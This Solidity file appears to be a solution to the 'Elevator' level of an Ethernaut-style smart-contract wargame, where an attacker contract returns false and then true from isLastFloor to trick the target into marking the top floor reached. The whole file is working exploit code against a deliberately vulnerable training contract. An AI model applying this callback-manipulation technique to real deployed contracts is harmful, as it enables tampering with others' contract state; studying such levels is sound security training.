// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Elevator.sol";

contract N11ElevatorAttacker {
    Elevator el;
    bool private isButtonPressed;

    constructor(address target) {
        el = Elevator(target);
    }

    function breakElevator() external {
        el.goTo(100);
    }

    /*
        This is our (malicious) implementation of the interface's function.
        In here, we can manipulate the return value as we see fit for our purpose.
        To pass this level we have to return false initially and then make sure
        that the next call returns true.
     */
    function isLastFloor(uint256) external returns (bool) {
        //button is not pressed initially.
        if (!isButtonPressed) {
            //PRESS THE BUTTON! and return false
            isButtonPressed = true;
            return false;
        } else {
            return true;
        }
    }
}
